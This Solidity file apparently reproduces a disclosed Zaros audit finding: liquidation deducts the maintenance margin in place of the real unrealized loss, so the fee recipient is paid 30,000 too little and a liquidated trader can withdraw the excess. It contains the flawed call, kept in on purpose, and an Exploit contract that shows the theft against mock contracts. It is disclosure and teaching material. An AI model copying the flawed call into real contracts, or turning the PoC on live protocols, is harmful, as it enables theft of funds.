// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/*//////////////////////////////////////////////////////////////////////////
    Zaros — Wrong parameter passed in TradingAccount::deductAccountMargin
    resulting in excess margin withdrawal
    (0xStalin, Codehawks 2024-07-zaros, finding #37995)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable LiquidationBranch call into deductAccountMargin is inlined
    VERBATIM (it passes requiredMaintenanceMarginUsdX18 where
    accountTotalUnrealizedPnlUsdX18 was intended). The Exploit deposits
    margin, liquidates the account, shows the fee recipient is shorted, and
    shows the trader withdraws the inflated excess margin left behind (no
    fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: on liquidation, the account's margin balance must be
    reduced by (a) the account's actual unrealized loss and (b) the
    liquidation fee, with the reduced amount transferred to the fee
    recipient. LiquidationBranch.liquidateAccounts instead passes
    `requiredMaintenanceMarginUsdX18` (the account's required maintenance
    margin — an unrelated, and in this scenario smaller, number) as the
    pnl-deduction argument, instead of `accountTotalUnrealizedPnlUsdX18`
    (the account's real unrealized loss). Because the wrong value is
    smaller, LESS is deducted/transferred to the fee recipient than the
    real loss requires, and the shortfall is left behind in the trading
    account's margin balance — fully withdrawable by the trader who was
    just liquidated.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal token used for the margin collateral / liquidation fee.
contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced TradingAccount. Tracks each account's margin collateral
///         balance and exposes the liquidation-time deduction + withdrawal
///         paths.
contract TradingAccount {
    MockToken public token;
    mapping(uint256 => uint256) public marginCollateralBalance;

    constructor(MockToken _token) {
        token = _token;
    }

    /// @notice Credits an account's margin balance; assumes the caller has
    ///         already funded this contract with the corresponding tokens.
    function credit(uint256 accountId, uint256 amount) external {
        marginCollateralBalance[accountId] += amount;
    }

    /// @notice Reduced deductAccountMargin. Realizes `pnlDeductionUsdX18`
    ///         (intended: the account's unrealized LOSS magnitude) plus the
    ///         settlement fee out of the account's margin balance,
    ///         transferring the deducted amount to the fee recipient.
    ///         Whatever remains stays as the account's margin balance,
    ///         withdrawable by the trader.
    function deductAccountMargin(
        uint256 accountId,
        uint256 pnlDeductionUsdX18,
        uint256 settlementFeeUsdX18,
        address settlementFeeRecipient
    )
        external
        returns (uint256 liquidatedCollateralUsdX18)
    {
        uint256 balanceBefore = marginCollateralBalance[accountId];
        uint256 totalDeduction = pnlDeductionUsdX18 + settlementFeeUsdX18;
        liquidatedCollateralUsdX18 = totalDeduction > balanceBefore ? balanceBefore : totalDeduction;
        marginCollateralBalance[accountId] = balanceBefore - liquidatedCollateralUsdX18;
        token.transfer(settlementFeeRecipient, liquidatedCollateralUsdX18);
    }

    function withdrawMarginUsd(uint256 accountId, address recipient) external returns (uint256 amount) {
        amount = marginCollateralBalance[accountId];
        marginCollateralBalance[accountId] = 0;
        token.transfer(recipient, amount);
    }
}

/// @notice Reduced LiquidationBranch. Mirrors the single vulnerable call
///         site from LiquidationBranch.liquidateAccounts.
contract LiquidationBranch {
    TradingAccount public tradingAccount;
    address public liquidationFeeRecipient;

    constructor(TradingAccount _tradingAccount, address _liquidationFeeRecipient) {
        tradingAccount = _tradingAccount;
        liquidationFeeRecipient = _liquidationFeeRecipient;
    }

    /// @param accountId The trading account being liquidated.
    /// @param accountTotalUnrealizedLossUsdX18 The account's ACTUAL unrealized loss magnitude (the correct value to deduct).
    /// @param requiredMaintenanceMarginUsdX18 The account's required maintenance margin (an UNRELATED number, wrongly substituted below).
    /// @param liquidationFeeUsdX18 The liquidation fee.
    function liquidateAccount(
        uint256 accountId,
        uint256 accountTotalUnrealizedLossUsdX18,
        uint256 requiredMaintenanceMarginUsdX18,
        uint256 liquidationFeeUsdX18
    )
        external
        returns (uint256 liquidatedCollateralUsdX18)
    {
        liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
            accountId: accountId,
            pnlDeductionUsdX18: requiredMaintenanceMarginUsdX18, // @> VULN: should be accountTotalUnrealizedLossUsdX18
            settlementFeeUsdX18: liquidationFeeUsdX18,
            settlementFeeRecipient: liquidationFeeRecipient
        });
        // FIX: pnlDeductionUsdX18: accountTotalUnrealizedLossUsdX18,
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    TradingAccount public tradingAccount; // CREATE nonce 2
    address public feeRecipient; // CREATE nonce 3 (marker contract)
    LiquidationBranch public liquidationBranch; // CREATE nonce 4
    uint256 public constant ACCOUNT_ID = 1;

    constructor() {
        token = new MockToken(); // nonce 1
        tradingAccount = new TradingAccount(token); // nonce 2
        feeRecipient = address(new FeeRecipientMarker()); // nonce 3
        liquidationBranch = new LiquidationBranch(tradingAccount, feeRecipient); // nonce 4
    }

    /// @notice Trader deposits 100,000 margin, holds a position with a real
    ///         unrealized loss of 60,000, and gets liquidated with a 1,000
    ///         fee. Shows the fee recipient is shorted 30,000 and the
    ///         trader withdraws that exact 30,000 excess.
    function run() external {
        uint256 deposit = 100_000e18;
        token.mint(address(tradingAccount), deposit);
        tradingAccount.credit(ACCOUNT_ID, deposit);

        uint256 correctLossMagnitude = 60_000e18; // accountTotalUnrealizedPnlUsdX18 (the correct value)
        uint256 requiredMaintenanceMargin = 30_000e18; // the WRONGLY-substituted value
        uint256 liquidationFee = 1_000e18;

        uint256 liquidatedCollateral =
            liquidationBranch.liquidateAccount(ACCOUNT_ID, correctLossMagnitude, requiredMaintenanceMargin, liquidationFee);

        // HARM STEP 1: only 31,000 (30,000 wrong-value + 1,000 fee) was sent
        // to the fee recipient, instead of the correct 61,000 (60,000 real
        // loss + 1,000 fee) — a 30,000 shortfall to the protocol.
        require(liquidatedCollateral == 31_000e18, "unexpected liquidated collateral (bug)");
        require(token.balanceOf(feeRecipient) == 31_000e18, "fee recipient underpaid");

        uint256 inflatedBalance = tradingAccount.marginCollateralBalance(ACCOUNT_ID);
        require(inflatedBalance == 69_000e18, "unexpected inflated margin balance");

        // HARM STEP 2: the trader (account owner) withdraws the inflated
        // remaining margin.
        uint256 withdrawn = tradingAccount.withdrawMarginUsd(ACCOUNT_ID, address(this));
        require(withdrawn == 69_000e18, "unexpected withdrawal amount");
        require(token.balanceOf(address(this)) == 69_000e18, "trader did not receive inflated margin");

        // Sanity: the excess the trader keeps equals exactly the deficit
        // shorted from the fee recipient — 30,000, the magnitude difference
        // between the wrongly-substituted value and the real loss.
        uint256 correctWithdrawal = deposit - correctLossMagnitude - liquidationFee; // 39,000
        uint256 excess = withdrawn - correctWithdrawal;
        require(excess == 30_000e18, "unexpected excess");
    }
}

contract FeeRecipientMarker {}
